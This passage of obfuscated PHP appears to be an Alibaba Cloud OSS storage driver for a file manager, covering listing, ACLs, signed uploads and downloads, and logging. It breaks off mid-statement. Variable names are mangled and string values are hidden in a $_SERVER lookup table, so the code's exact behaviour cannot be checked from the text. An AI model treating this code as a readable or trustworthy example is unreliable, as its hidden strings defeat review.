$áÆı²Ò‹[188] => $this->ext($å†¤œöˆ)); if ($¢ú×Ó¡™) { return $ŠÓİöÎ±; } $ŠÓİöÎ±[$áÆı²Ò‹[232]] = $ŠÓİöÎ±[$áÆı²Ò‹[98]] = 0; $ŠÓİöÎ±[$áÆı²Ò‹[233]] = $ŠÓİöÎ±[$áÆı²Ò‹[234]] = !0; if (empty($µííÀ¨)) { $ÇµúŒï« = $this->objectMeta($å†¤œöˆ); if (!$ÇµúŒï«) { return $ŠÓİöÎ±; } $µííÀ¨ = array($áÆı²Ò‹[98] => strtotime($ÇµúŒï«[$áÆı²Ò‹[1448]]), $áÆı²Ò‹[89] => $ÇµúŒï«[$áÆı²Ò‹[1447]] + 0, $áÆı²Ò‹[1446] => $ÇµúŒï«[$áÆı²Ò‹[1446]]); } if (isset($µííÀ¨[$áÆı²Ò‹[1446]]) && $µííÀ¨[$áÆı²Ò‹[1446]]) { $ŠÓİöÎ±[$áÆı²Ò‹[236]] = trim($µííÀ¨[$áÆı²Ò‹[1446]], $áÆı²Ò‹[131]); } if (isset($µííÀ¨[$áÆı²Ò‹[89]])) { $ŠÓİöÎ±[$áÆı²Ò‹[89]] = $µííÀ¨[$áÆı²Ò‹[89]]; } if (isset($µííÀ¨[$áÆı²Ò‹[98]])) { $ŠÓİöÎ±[$áÆı²Ò‹[98]] = $µííÀ¨[$áÆı²Ò‹[98]]; } if (isset($µííÀ¨[$áÆı²Ò‹[207]]) && !trim($ŠÓİöÎ±[$áÆı²Ò‹[98]])) { $ŠÓİöÎ±[$áÆı²Ò‹[98]] = $µííÀ¨[$áÆı²Ò‹[207]]; } return $ŠÓİöÎ±; } private function folderInfo($»ı„ùì‡, $‰Åâ¤ïË = false, $ıÛÜÔà = array()) { $Ø™ÉÁİ÷ =& $_SERVER[Õò”†—·]; $Ñ¿´ıìù = array($Ø™ÉÁİ÷[42] => $this->pathThis($»ı„ùì‡), $Ø™ÉÁİ÷[97] => $this->getPathOuter($Ø™ÉÁİ÷[18] . $»ı„ùì‡), $Ø™ÉÁİ÷[43] => $Ø™ÉÁİ÷[88]); if ($‰Åâ¤ïË) { return $Ñ¿´ıìù; } $Ñ¿´ıìù[$Ø™ÉÁİ÷[232]] = $Ñ¿´ıìù[$Ø™ÉÁİ÷[98]] = 0; $Ñ¿´ıìù[$Ø™ÉÁİ÷[233]] = $Ñ¿´ıìù[$Ø™ÉÁİ÷[234]] = !0; if (empty($ıÛÜÔà)) { $»ı„ùì‡ = rtrim($»ı„ùì‡, $Ø™ÉÁİ÷[18]) . $Ø™ÉÁİ÷[18]; $”øö¶‰ş = $this->objectMeta($»ı„ùì‡); if (!$”øö¶‰ş) { return $Ñ¿´ıìù; } $ıÛÜÔà = array($Ø™ÉÁİ÷[232] => $”øö¶‰ş[$Ø™ÉÁİ÷[560]][$Ø™ÉÁİ÷[1455]], $Ø™ÉÁİ÷[98] => strtotime($”øö¶‰ş[$Ø™ÉÁİ÷[1448]])); } if (isset($ıÛÜÔà[$Ø™ÉÁİ÷[98]])) { $Ñ¿´ıìù[$Ø™ÉÁİ÷[98]] = $ıÛÜÔà[$Ø™ÉÁİ÷[98]]; } if (isset($ıÛÜÔà[$Ø™ÉÁİ÷[232]])) { $Ñ¿´ıìù[$Ø™ÉÁİ÷[232]] = $ıÛÜÔà[$Ø™ÉÁİ÷[232]]; } return $Ñ¿´ıìù; } public function listPath($çÛ‘ÄĞñ, $¸ãêš© = false) { $Ö²£øøŸ =& $_SERVER[Õò”†—·]; $ıåå°±Ë = $this->fileList($çÛ‘ÄĞñ, $Ö²£øøŸ[18], !0); foreach ($ıåå°±Ë[$Ö²£øøŸ[95]] as $¯öœÈ²Ú => $“ÜàéôÚ) { $ıåå°±Ë[$Ö²£øøŸ[95]][$¯öœÈ²Ú] = $this->folderInfo($“ÜàéôÚ, $¸ãêš©, $“ÜàéôÚ); } foreach ($ıåå°±Ë[$Ö²£øøŸ[96]] as $¯öœÈ²Ú => $“ÜàéôÚ) { $ıåå°±Ë[$Ö²£øøŸ[96]][$¯öœÈ²Ú] = $this->fileInfo($“ÜàéôÚ[$Ö²£øøŸ[42]], $¸ãêš©, $“ÜàéôÚ); } return $ıåå°±Ë; } protected function infoChildren($±•İŞ·í, &$¯€ê‚Ã) { $¥ÍÉ¶ğ =& $_SERVER[Õò”†—·]; $…ŞÜæ„ = $this->fileList($±•İŞ·í, $¥ÍÉ¶ğ[22], !0); $¯€ê‚Ã[$¥ÍÉ¶ğ[91]] += count($…ŞÜæ„[$¥ÍÉ¶ğ[95]]); $¯€ê‚Ã[$¥ÍÉ¶ğ[90]] += count($…ŞÜæ„[$¥ÍÉ¶ğ[96]]); foreach ($…ŞÜæ„[$¥ÍÉ¶ğ[96]] as $€­ó³¨) { if (!$€­ó³¨ || !$€­ó³¨[$¥ÍÉ¶ğ[89]]) { continue; } $¯€ê‚Ã[$¥ÍÉ¶ğ[89]] += $€­ó³¨[$¥ÍÉ¶ğ[89]]; } } public function has($ºËÃ•°, $ñóÚ÷‚Ö = false, $û“ŞáÌà = true) { $Ğ…Ì×ğ® =& $_SERVER[Õò”†—·]; $ºËÃ•° = trim($ºËÃ•°, $Ğ…Ì×ğ®[18]); $ñ¿¥‚úı = empty($ºËÃ•°) && $ºËÃ•° !== $Ğ…Ì×ğ®[229] ? $Ğ…Ì×ğ®[22] : $ºËÃ•° . $Ğ…Ì×ğ®[18]; $§â¬‰’ = $Ğ…Ì×ğ®[22]; $šúÍ¼ÙÑ = 500; $õÆòÕ× = $ç›´’»£ = 0; while (!0) { check_abort(); $şÎƒÅ§ = array($Ğ…Ì×ğ®[1442] => $Ğ…Ì×ğ®[18], $Ğ…Ì×ğ®[1443] => $ñ¿¥‚úı, $Ğ…Ì×ğ®[1444] => $šúÍ¼ÙÑ, $Ğ…Ì×ğ®[1445] => $§â¬‰’); try { $çŞ•±Ü¹ = $this->client->listObjects($this->bucket, $şÎƒÅ§); } catch (OSS\Core\OssException $¿§íÔç¤) { $this->writeLog(__FUNCTION__ . $Ğ…Ì×ğ®[215] . $¿§íÔç¤->getMessage()); break; } $§â¬‰’ = $çŞ•±Ü¹->getNextMarker(); $ŠçÔè×± = $çŞ•±Ü¹->getObjectList(); $–ñòßØ¼ = $çŞ•±Ü¹->getPrefixList(); if ($ñóÚ÷‚Ö) { if (count($ŠçÔè×±) > 1 || count($ŠçÔè×±) == 1 && $ŠçÔè×±[0]->getKey() != $ñ¿¥‚úı) { $õÆòÕ× += count($ŠçÔè×±) - 1; } if (!empty($–ñòßØ¼)) { $ç›´’»£ += count($–ñòßØ¼); } if ($§â¬‰’ === $Ğ…Ì×ğ®[22]) { break; } continue; } if ($û“ŞáÌà) { if (!empty($ŠçÔè×±)) { if (count($ŠçÔè×±) > 1 || $ŠçÔè×±[0]->getKey() != $ñ¿¥‚úı) { return !0; } } } else { if (!empty($–ñòßØ¼)) { return !0; } } if ($§â¬‰’ === $Ğ…Ì×ğ®[22]) { break; } } if ($ñóÚ÷‚Ö) { return array($Ğ…Ì×ğ®[240] => $õÆòÕ×, $Ğ…Ì×ğ®[241] => $ç›´’»£); } return !1; } public function listAll($É©£ıõ) { $»§¼Ñ =& $_SERVER[Õò”†—·]; $õ‡Ú–§› = $this->fileList($É©£ıõ, $»§¼Ñ[22], !0); $Ò‘íÑ†ş = array_to_keyvalue($õ‡Ú–§›[$»§¼Ñ[96]], $»§¼Ñ[42]); foreach ($õ‡Ú–§›[$»§¼Ñ[95]] as $£û–¬Ñó) { if (is_string($£û–¬Ñó)) { $Ò‘íÑ†ş[$£û–¬Ñó] = array($»§¼Ñ[89] => 0); } } return $this->listAllFiles($É©£ıõ, $Ò‘íÑ†ş); } public function canRead($Âßœšß‡) { $ó¡ıø³ö =& $_SERVER[Õò”†—·]; $ûúñâÜå = $this->pathAcl($Âßœšß‡); return $ûúñâÜå == $ó¡ıø³ö[1456] || $ûúñâÜå == $ó¡ıø³ö[603] ? !0 : !1; } public function canWrite($ñ‚ÎÙ“§) { $âú£½í = $this->pathAcl($ñ‚ÎÙ“§); return $âú£½í == $_SERVER[Õò”†—·][603] ? !0 : !1; } public function pathAcl($—§®äã) { $İ¡Ó»Ï =& $_SERVER[Õò”†—·]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $±°–ç™ß = $this->client->getObjectAcl($this->bucket, $this->pathEncode($—§®äã)); } catch (OSS\Core\OssException $Ÿşº¥¯) { $this->writeLog(__FUNCTION__ . $İ¡Ó»Ï[215] . $Ÿşº¥¯->getMessage()); return !1; } $¹Ç©®²ö = $±°–ç™ß == $İ¡Ó»Ï[47] ? $this->bucketAcl : $±°–ç™ß; if ($¹Ç©®²ö == $İ¡Ó»Ï[1457]) { return $İ¡Ó»Ï[1456]; } if ($¹Ç©®²ö == $İ¡Ó»Ï[1458]) { return $İ¡Ó»Ï[603]; } return $¹Ç©®²ö; } private function chmodPath($ÙõÍ‚ßÛ, $Ÿ“Ë³Á¯ = '') { $ç­¬úŞ£ =& $_SERVER[Õò”†—·]; $Ôƒ²´¶´ = empty($Ÿ“Ë³Á¯) ? $ç­¬úŞ£[1458] : $Ÿ“Ë³Á¯; $»û­İ = array($ç­¬úŞ£[47], $ç­¬úŞ£[230], $ç­¬úŞ£[1457], $ç­¬úŞ£[1458]); if (!in_array($Ôƒ²´¶´, $»û­İ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($ÙõÍ‚ßÛ), $Ôƒ²´¶´); } catch (OSS\Core\OssException $öÈ•ÃøÃ) { $this->writeLog(__FUNCTION__ . $ç­¬úŞ£[215] . $öÈ•ÃøÃ->getMessage()); return !1; } return !0; } public function getContent($ú³ä‘á) { return $this->fileSubstr($ú³ä‘á, -1); } public function setContent($¤¸Üüş‰, $ÈÛÉ«‘Ú = '') { $’Åô¤º¾ =& $_SERVER[Õò”†—·]; try { $“•¦åÀÀ = $this->trafficLimit($’Åô¤º¾[1459]); $¢äÃ¡ä¤ = $this->client->putObject($this->bucket, $this->pathEncode($¤¸Üüş‰), $ÈÛÉ«‘Ú, $“•¦åÀÀ); } catch (OSS\Core\OssException $»„‡ôœñ) { $this->writeLog(__FUNCTION__ . $’Åô¤º¾[215] . $»„‡ôœñ->getMessage()); return !1; } $ˆ“õÎ‹ = array($’Åô¤º¾[1449] => trim($¢äÃ¡ä¤[$’Åô¤º¾[1446]], $’Åô¤º¾[131]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($¤¸Üüş‰))); $this->updateObjMeta($¤¸Üüş‰, $ˆ“õÎ‹); return isset($¢äÃ¡ä¤[$’Åô¤º¾[1460]][$’Åô¤º¾[292]]) ? !0 : !1; } private function updateObjMeta($ºÁ„âõ, $Š¨é¤§) { $ºÁ„âõ = $this->pathEncode($ºÁ„âõ); try { $ä ÔÍÂ¼ = array(OSS\OssClient::OSS_HEADERS => $Š¨é¤§); $this->client->copyObject($this->bucket, $ºÁ„âõ, $this->bucket, $ºÁ„âõ, $ä ÔÍÂ¼); } catch (OSS\Core\OssException $ò³Ô¨¹ã) { $this->writeLog(__FUNCTION__ . $_SERVER[Õò”†—·][215] . $ò³Ô¨¹ã->getMessage()); return !1; } return !0; } public function upload($•Šíã±, $ÓÏ–’í‘, $ÂîáóŞœ = false, $ÜŞ‡¸¥Ñ = REPEAT_REPLACE) { $îí¹Ÿ¯Ô =& $_SERVER[Õò”†—·]; $€øÀ™Òô = trim($•Šíã±, $îí¹Ÿ¯Ô[18]); $¡¿İ»Íç = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($îí¹Ÿ¯Ô[1449] => @md5_file($ÓÏ–’í‘)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($•Šíã±))); $¡¿İ»Íç = $this->trafficLimit($îí¹Ÿ¯Ô[1459], $¡¿İ»Íç); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($€øÀ™Òô), $ÓÏ–’í‘, $¡¿İ»Íç); } catch (OSS\Core\OssException $±ª®ñôã) { $this->writeLog(__FUNCTION__ . $îí¹Ÿ¯Ô[215] . $±ª®ñôã->getMessage()); return !1; } return $this->getPathOuter($•Šíã±); } public function getHost() { $äœ… =& $_SERVER[Õò”†—·]; $‹Ò‘î§æ = explode($äœ…[211], parent::getHost()); return $‹Ò‘î§æ[0] . $äœ…[211] . $this->bucket . $äœ…[20] . $‹Ò‘î§æ[1]; } public function uploadFormData($¥¼î½Ç›, $€‹±•¿Ê = 3600) { $­°Òô¯œ =& $_SERVER[Õò”†—·]; if (!($ËÃ†¶€ = $this->getHost())) { return !1; } $µâªü€ = $€‹±•¿Ê; $½š±Ø = date($­°Òô¯œ[1461], time() + $µâªü€); $–Èç·Œ = new DateTime($½š±Ø); $¼Õ¶®¿® = $–Èç·Œ->format(DateTime::ISO8601); $Ø‹×„åÕ = strpos($¼Õ¶®¿®, $­°Òô¯œ[356]); $¼Õ¶®¿® = substr($¼Õ¶®¿®, 0, $Ø‹×„åÕ) . $­°Òô¯œ[1462]; $²˜÷¡ = 1048576000 * 5; $ÜáçÇş» = $this->pathFather($¥¼î½Ç›); $íÃığÜ = array($­°Òô¯œ[275] => $¼Õ¶®¿®, $­°Òô¯œ[278] => array(array($­°Òô¯œ[1463], 0, $²˜÷¡), array($­°Òô¯œ[281], $­°Òô¯œ[282], $ÜáçÇş»))); $Ï»›é©É = base64_encode(json_encode($íÃığÜ)); $“´ÔÓ = base64_encode(hash_hmac($­°Òô¯œ[263], $Ï»›é©É, $this->secret, !0)); $‰æÉ¨¨¾ = array($­°Òô¯œ[293] => $Ï»›é©É, $­°Òô¯œ[1464] => $this->accessKey, $­°Òô¯œ[285] => $­°Òô¯œ[274], $­°Òô¯œ[1465] => $“´ÔÓ, $­°Òô¯œ[209] => $ËÃ†¶€); $‰æÉ¨¨¾ = $this->trafficLimit($­°Òô¯œ[1459], $‰æÉ¨¨¾); return $‰æÉ¨¨¾; } public function multiUploadFormData($Ó“¶Ù…ñ, $ü½„ˆüš = 3600) { $Şâàš =& $_SERVER[Õò”†—·]; if (!($øÖ˜Ñš± = $this->getHost())) { return !1; } $€ä¢¥™Ñ = $this->trafficLimit($Şâàš[1459]); $£§íüÓ± = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Ó“¶Ù…ñ), $€ä¢¥™Ñ); return array($Şâàš[255] => $£§íüÓ±, $Şâàš[209] => $øÖ˜Ñš± . $Şâàš[18] . $this->pathEncode($Ó“¶Ù…ñ), $Şâàš[256] => gmdate($Şâàš[1466]), $Şâàš[107] => $Ó“¶Ù…ñ); } public function multiUploadAuthData($ºİå¶ĞÀ, $Â¢†Şå = array()) { $ĞãôÎÌ¶ =& $_SERVER[Õò”†—·]; $¢êİæ¼Ç = isset($Â¢†Şå[$ĞãôÎÌ¶[256]]) ? $Â¢†Şå[$ĞãôÎÌ¶[256]] : gmdate($ĞãôÎÌ¶[1466]); $°ÛÄÛÔö = isset($Â¢†Şå[$ĞãôÎÌ¶[188]]) ? $Â¢†Şå[$ĞãôÎÌ¶[188]] : $ĞãôÎÌ¶[22]; $’ğÒãªĞ = $ºİå¶ĞÀ; if (isset($Â¢†Şå[$ĞãôÎÌ¶[107]])) { $’ğÒãªĞ = $Â¢†Şå[$ĞãôÎÌ¶[107]]; unset($Â¢†Şå[$ĞãôÎÌ¶[107]]); } if (isset($Â¢†Şå[$ĞãôÎÌ¶[257]])) { $Â¢†Şå[$ĞãôÎÌ¶[256]] = $¢êİæ¼Ç; return $this->listUploadParts($’ğÒãªĞ, $Â¢†Şå); } $ª™¥®Ç = array($ĞãôÎÌ¶[258], $ĞãôÎÌ¶[22], $ĞãôÎÌ¶[133], $¢êİæ¼Ç, "\170\55\157\163\163\x2d\x64\141\x74\x65\x3a{$¢êİæ¼Ç}", $ĞãôÎÌ¶[18] . $this->bucket . $ĞãôÎÌ¶[18] . $’ğÒãªĞ . $°ÛÄÛÔö); if (strpos($°ÛÄÛÔö, $ĞãôÎÌ¶[259]) === 0) { $ª™¥®Ç[0] = $ĞãôÎÌ¶[260]; if ($°éÈÊôú = $this->trafficLimit($ĞãôÎÌ¶[1459])) { $’ğÒãªĞ = $ĞãôÎÌ¶[1467]; array_splice($ª™¥®Ç, 5, 0, $’ğÒãªĞ . $ĞãôÎÌ¶[4] . $°éÈÊôú[$’ğÒãªĞ]); } } if (isset($Â¢†Şå[$ĞãôÎÌ¶[261]]) && $Â¢†Şå[$ĞãôÎÌ¶[261]] == $ĞãôÎÌ¶[262]) { $ª™¥®Ç[0] = $ĞãôÎÌ¶[262]; } if (!empty($Â¢†Şå[$ĞãôÎÌ¶[1468]])) { $Šœ˜Ô½Š = array_merge(array($ª™¥®Ç[4]), $Â¢†Şå[$ĞãôÎÌ¶[1468]]); sort($Šœ˜Ô½Š); $ª™¥®Ç[4] = implode($ĞãôÎÌ¶[12], $Šœ˜Ô½Š); } $Ë…‰Ó¥† = implode($ĞãôÎÌ¶[12], $ª™¥®Ç); $ç˜ĞêøÖ = base64_encode(hash_hmac($ĞãôÎÌ¶[263], $Ë…‰Ó¥†, $this->secret, !0)); $ç¤¢ºº = $ĞãôÎÌ¶[1432] . $this->accessKey . $ĞãôÎÌ¶[4] . $ç˜ĞêøÖ; if (strpos($°ÛÄÛÔö, $ĞãôÎÌ¶[259]) === 0) { $ç¤¢ºº = array($ĞãôÎÌ¶[265] => $ç¤¢ºº, $ĞãôÎÌ¶[256] => $¢êİæ¼Ç); if ($°éÈÊôú) { $ç¤¢ºº = array_merge($ç¤¢ºº, $°éÈÊôú); } } return $ç¤¢ºº; } public function listUploadParts($°ˆ£ñ‰†, $š‘á¶¸º) { $ÁËØ¶å =& $_SERVER[Õò”†—·]; $ç´ã…µ = parse_url_query($š‘á¶¸º[$ÁËØ¶å[188]]); $è”œâ×Ø = $this->client->listParts($this->bucket, $this->pathEncode($°ˆ£ñ‰†), $ç´ã…µ[$ÁËØ¶å[255]]); $”–óˆ¸ = $è”œâ×Ø->getListPart(); $Âí­ÍôÑ = array(); foreach ($”–óˆ¸ as $¦Â¹Œ‰ü) { $Âí­ÍôÑ[] = array($ÁËØ¶å[1453] => $¦Â¹Œ‰ü->getPartNumber(), $ÁËØ¶å[1454] => trim($¦Â¹Œ‰ü->getETag(), $ÁËØ¶å[131])); } unset($š‘á¶¸º[$ÁËØ¶å[257]], $š‘á¶¸º[$ÁËØ¶å[261]]); $“ÎØ€²ó = $this->multiUploadAuthData($°ˆ£ñ‰†, $š‘á¶¸º); if (empty($“ÎØ€²ó)) { return !1; } return array($ÁËØ¶å[265] => $“ÎØ€²ó, $ÁËØ¶å[256] => $š‘á¶¸º[$ÁËØ¶å[256]], $ÁËØ¶å[267] => $Âí­ÍôÑ); } public function download($¤”œ³û, $ÀİÌû„¤) { $æú÷ïÖÆ =& $_SERVER[Õò”†—·]; if ($this->isFolder($¤”œ³û)) { return !1; } try { $²êåÈ¦© = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $ÀİÌû„¤); $²êåÈ¦© = $this->trafficLimit($æú÷ïÖÆ[122], $²êåÈ¦©); $this->client->getObject($this->bucket, $this->pathEncode($¤”œ³û), $²êåÈ¦©); } catch (OSS\Core\OssException $ïÅœá…Ø) { $this->writeLog(__FUNCTION__ . $æú÷ïÖÆ[215] . $ïÅœá…Ø->getMessage()); return !1; } return $ÀİÌû„¤; } public function fileSubstr($±—Õ®è, $åî©šüŠ = 0, $Çï¥¡Ò‰ = false) { if ($åî©šüŠ === -1) { $å«õ¥ô¡ = array(); } else { if ($Çï¥¡Ò‰ === !1) { $°±ïÇ‰£ = $this->size($±—Õ®è); } else { $°±ïÇ‰£ = $åî©šüŠ + $Çï¥¡Ò‰ - 1; } $å«õ¥ô¡ = array(OSS\OssClient::OSS_RANGE => "{$åî©šüŠ}\55{$°±ïÇ‰£}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($±—Õ®è), $å«õ¥ô¡); } catch (OSS\Core\OssException $Ïñºó¼¸) { $this->writeLog(__FUNCTION__ . $_SERVER[Õò”†—·][215] . $Ïñºó¼¸->getMessage()); think_exception($Ïñºó¼¸->getMessage()); return !1; } } private function trafficLimit($¹È××®¥, $ƒˆ‡Ÿ¢Ñ = array()) { $¯¸şù­ =& $_SERVER[Õò”†—·]; if ($¹È××®¥ == $¯¸şù­[1459] && $this->isUploadServer() || $¹È××®¥ == $¯¸şù­[122] && $this->isFileOutServer()) { return $ƒˆ‡Ÿ¢Ñ; } $Ìº¯åÁ = floatval($GLOBALS[$¯¸şù­[16]][$¯¸şù­[102]][$¯¸şù­[120]][$¹È××®¥]) * 1024 * 1024 * 8; if (!$Ìº¯åÁ) { return $ƒˆ‡Ÿ¢Ñ; } $Ìº¯åÁ = $Ìº¯åÁ < 819200 ? 819200 : ($Ìº¯åÁ > 838860800 ? 838860800 : $Ìº¯åÁ); $ƒˆ‡Ÿ¢Ñ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($Ìº¯åÁ); return $ƒˆ‡Ÿ¢Ñ; } public function link($™“õäË¯, $¼ÔˆÌ¢ = array()) { $Óœ°çüò =& $_SERVER[Õò”†—·]; if (!$this->exist($™“õäË¯) || $this->isFolder($™“õäË¯)) { return !1; } try { $¼ÔˆÌ¢ = $this->trafficLimit($Óœ°çüò[122], $¼ÔˆÌ¢); $Ùæù–ôÛ = $this->client->signUrl($this->bucket, $this->pathEncode($™“õäË¯), 3600 * 12, $Óœ°çüò[262], $¼ÔˆÌ¢); return $this->getCdnLink($Ùæù–ôÛ); } catch (OSS\Core\OssException $‹‘Ñµ») { $this->writeLog(__FUNCTION__ . $Óœ°çüò[215] . $‹‘Ñµ»->getMessage()); return !1; } } public function fileOut($ğ„·¿Æ¡, $ˆÚ¾şÌ = false, $Ûûü‰ë = false, $Ûã»Í £ = '') { $â²¾Ğ± =& $_SERVER[Õò”†—·]; if ($this->isFileOutServer()) { return $this->fileOutServer($ğ„·¿Æ¡, $ˆÚ¾şÌ, $Ûûü‰ë, $Ûã»Í £); } if (!$Ûûü‰ë) { $Ûûü‰ë = $this->pathThis($ğ„·¿Æ¡); } $Ûûü‰ë = rawurlencode($Ûûü‰ë); $ü¨ìÆı = get_file_mime(get_path_ext($Ûûü‰ë)); if ($ü¨ìÆı == $â²¾Ğ±[249]) { return parent::fileOut($ğ„·¿Æ¡, $ˆÚ¾şÌ, $Ûûü‰ë, $Ûã»Í £); } $ˆÚ¾şÌ = $ˆÚ¾şÌ ? $â²¾Ğ±[1469] : $â²¾Ğ±[1470]; $æ¿´õ–˜ = array(OSS\OssClient::OSS_SUB_RESOURCE => $â²¾Ğ±[1471] . rawurlencode("{$ˆÚ¾şÌ}\x3b\x66\151\x6c\x65\x6e\x61\x6d\145\75{$Ûûü‰ë}")); $æ¿´õ–˜[OSS\OssClient::OSS_SUB_RESOURCE] .= $â²¾Ğ±[1472] . rawurlencode($ü¨ìÆı); $ùÕ£†Éé = $this->link($ğ„·¿Æ¡, $æ¿´õ–˜); $this->fileOutLink($ùÕ£†Éé); } public function fileOutServer($ù‡éö´„, $ü¥å´¥ç = false, $ıåÙáğô = false, $ÓøÁŞ = '') { parent::fileOut($ù‡éö´„, $ü¥å´¥ç, $ıåÙáğô, $ÓøÁŞ); } public function fileOutImage($¾Áº„Ğ„, $È÷†—Äğ = 250) { if ($this->size($¾Áº„Ğ„) > 1024 * 1024 * 20) { return $this->fileOutImageServer($¾Áº„Ğ„, $È÷†—Äğ); } $åÓÄÍò = array(OSS\OssClient::OSS_PROCESS => $_SERVER[Õò”†—·][1429] . $È÷†—Äğ); $—µüİôˆ = $this->link($¾Áº„Ğ„, $åÓÄÍò); $this->fileOutLink($—µüİôˆ); } public function fileOutImageServer($ËÂ¾Ü¬Ã, $º¥€™ÅÔ = 250) { parent::fileOutImage($ËÂ¾Ü¬Ã, $º¥€™ÅÔ); } public function fileOutLink($ÄÃäåÈ) { $ÀÎÇÖÈ¥ =& $_SERVER[Õò”†—·]; if (!$this->isCdnHost() && substr($ÄÃäåÈ, 0, 7) == $ÀÎÇÖÈ¥[1378]) { $ÄÃäåÈ = $ÀÎÇÖÈ¥[1379] . substr($ÄÃäåÈ, 7); } header($ÀÎÇÖÈ¥[175] . $ÄÃäåÈ); die; } public function hashMd5($İ«¥¿ş, $É“Ãş¹ş = '') { $ô»—£ôè =& $_SERVER[Õò”†—·]; $…¡Ö§È¾ = $this->_objectMeta($İ«¥¿ş); if (!$…¡Ö§È¾) { return $ô»—£ôè[22]; } if (!isset($…¡Ö§È¾[$ô»—£ôè[1449]]) && !empty($É“Ãş¹ş)) { $Ï¬»Ûî‘ = $this->updateObjMeta($İ«¥¿ş, array($ô»—£ôè[1449] => $É“Ãş¹ş)); $…¡Ö§È¾[$ô»—£ôè[1449]] = $Ï¬»Ûî‘ ? $É“Ãş¹ş : $ô»—£ôè[22]; } return isset($…¡Ö§È¾[$ô»—£ôè[1449]]) ? strtolower($…¡Ö§È¾[$ô»—£ôè[1449]]) : $ô»—£ôè[22]; } public function size($¦’şÁø) { $ÓÌ†ßú’ = $this->objectMeta($¦’şÁø); return $ÓÌ†ßú’ ? $ÓÌ†ßú’[$_SERVER[Õò”†—·][89]] : 0; } public function info($Ìàî³‡ö) { if ($this->isFolder($Ìàî³‡ö)) { return $this->folderInfo($Ìàî³‡ö); } else { if ($this->isFile($Ìàî³‡ö)) { return $this->fileInfo($Ìàî³‡ö); } } return !1; } public function exist($İ˜¯á­â) { return $this->isFile($İ˜¯á­â) || $this->isFolder($İ˜¯á­â); } public function isFile($Öô‹ùíÍ) { return !$this->isFolder($Öô‹ùíÍ) && $this->objectMeta($Öô‹ùíÍ); } public function isFolder($Ô•“Ä²Ì) { return $this->cacheMethod($_SERVER[Õò”†—·][179], $Ô•“Ä²Ì); } protected function objectMeta($ËÍ°Ÿâ¯) { return $this->cacheMethod($_SERVER[Õò”†—·][181], $ËÍ°Ÿâ¯); } protected function _objectMeta($³¸ˆø³·) { $µ¾®Ôà  =& $_SERVER[Õò”†—·]; try { $°ßÈ©•İ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($³¸ˆø³·)); } catch (OSS\Core\OssException $ú¢ŞƒĞ) { $this->writeLog(__FUNCTION__ . $µ¾®Ôà [215] . $ú¢ŞƒĞ->getMessage()); $°ßÈ©•İ = !1; } if ($°ßÈ©•İ) { $°ßÈ©•İ[$µ¾®Ôà [89]] = intval($°ßÈ©•İ[$µ¾®Ôà [1447]]); } return $°ßÈ©•İ; } protected function _isFolder($Ê¡Âü) { $°é“ó =& $_SERVER[Õò”†—·]; if ($Ê¡Âü == $°é“ó[22] || $Ê¡Âü == $°é“ó[18]) { return !0; } $¯áÀ¼¹ß = array($°é“ó[1442] => $°é“ó[18], $°é“ó[1443] => rtrim($Ê¡Âü, $°é“ó[18]) . $°é“ó[18], $°é“ó[1444] => 1, $°é“ó[1445] => $°é“ó[22]); $Ãüïûˆ = $this->client->listObjects($this->bucket, $¯áÀ¼¹ß); if ($Ãüïûˆ->getObjectList() || $Ãüïûˆ->getPrefixList()) { return !0; } return !1; } public function writeLog($Œ­Ğ‚óø = '', $ş¬§ŞÏ  = false) { $üÏ£¤íµ =& $_SERVER[Õò”†—·]; $ˆú³¡Ç = in_array(ACTION, array($üÏ£¤íµ[213], $üÏ£¤íµ[214])); if (!$ˆú³¡Ç && !GLOBAL_DEBUG) { return; } $Î›§»¾– = 0; if (stripos($Œ­Ğ‚óø, $üÏ£¤íµ[1473]) !== !1) { $Î›§»¾– = 1; $ÅÍ˜‘…« = explode($üÏ£¤íµ[1474], $Œ­Ğ‚óø); $Œ­Ğ‚óø = !empty($ÅÍ˜‘…«[1]) ? $ÅÍ˜‘…«[1] : $Œ­Ğ‚óø; } else { if (stripos($Œ­Ğ‚óø, $üÏ£¤íµ[1475])) { $Î›§»¾– = 2; $ÅÍ˜‘…« = explode($üÏ£¤íµ[1475], $Œ­Ğ‚óø); $ÅÍ˜‘…« = explode($üÏ£¤íµ[4], $ÅÍ˜‘…«[0]); $Œ­Ğ‚óø = !empty($ÅÍ˜‘…«[1]) ? $ÅÍ˜‘…«[1] : $Œ­Ğ‚óø; } } if ($ˆú³¡Ç && I18n::getType() == $üÏ£¤íµ[1476]) { if ($Î›§»¾– == 1) { $Œ­Ğ‚óø = str_replace($üÏ£¤íµ[1477], $üÏ£¤íµ[1478], $Œ­Ğ‚óø); } else { if ($Î›§»¾– == 2) { $ÅÍ˜‘…« = explode($üÏ£¤íµ[215], $ÅÍ˜‘…«[0]); $Ôû«‚Ìù = isset($ÅÍ˜‘…«[1]) ? $ÅÍ˜‘…«[1] : $üÏ£¤íµ[22]; $ËÃÆê½ = array($üÏ£¤íµ[1479] => $üÏ£¤íµ[1480], $üÏ£¤íµ[1481] => $üÏ£¤íµ[1482], $üÏ£¤íµ[1483] => $üÏ£¤íµ[1484], $üÏ£¤íµ[1485] => $üÏ£¤íµ[1486], $üÏ£¤íµ[1487] => $üÏ£¤íµ[1488], $üÏ£¤íµ[1489] => $üÏ£¤íµ[1490], $üÏ£¤íµ[1491] => $üÏ£¤íµ[1492], $üÏ£¤íµ[1493] => $üÏ£¤íµ[1494], $üÏ£¤íµ[1495] => $üÏ£¤íµ[1496], $üÏ£¤íµ[1497] => $üÏ£¤íµ[1498]); if (isset($ËÃÆê½[$Ôû«‚Ìù])) { $Œ­Ğ‚óø = $ËÃÆê½[$Ôû«‚Ìù]; } } } if (stripos($Œ­Ğ‚óø, $üÏ£¤íµ[1499])) { $Œ­Ğ‚óø = $üÏ£¤íµ[1500]; } } if 